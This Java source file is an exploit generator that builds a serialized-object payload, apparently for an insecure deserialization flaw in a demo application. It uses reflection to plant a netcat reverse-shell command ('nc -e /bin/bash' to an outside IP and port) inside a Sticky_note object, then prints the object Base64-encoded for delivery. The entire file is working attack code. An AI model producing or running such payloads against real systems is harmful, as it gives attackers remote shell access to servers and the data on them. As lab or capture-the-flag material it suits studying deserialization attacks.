import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import com.example.demo.*;

class Main{
    public static void main(String[] args) 
    throws NoSuchFieldException, SecurityException,
     IllegalArgumentException, IllegalAccessException, IOException 
    {
        // object of Eval_util class
        com.example.demo.Eval_util evutil = new com.example.demo.Eval_util();
        // get declared field val from Eval_util
        Field val = com.example.demo.Eval_util.class.getDeclaredField("val");
        // So we can access it 
        val.setAccessible(true);
        // set 'val' value for netcat reverse shell
        val.set(evutil,new String("nc -e /bin/bash 117.242.246.224 8882"));

        // main sticky_note class instance
        com.example.demo.Sticky_note stnote = new com.example.demo.Sticky_note("payload executed", 0);
        Field data = com.example.demo.Sticky_note.class.getDeclaredField("data");
        // set data to our payload
        data.setAccessible(true);
        data.set(stnote,evutil);

        // get base64 encoded payload
        ByteArrayOutputStream objectBOS = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(objectBOS);
        out.writeObject(stnote);
        out.close();
        String payload = Base64.getEncoder().encodeToString(objectBOS.toByteArray());
        System.out.println(payload);
    }
}
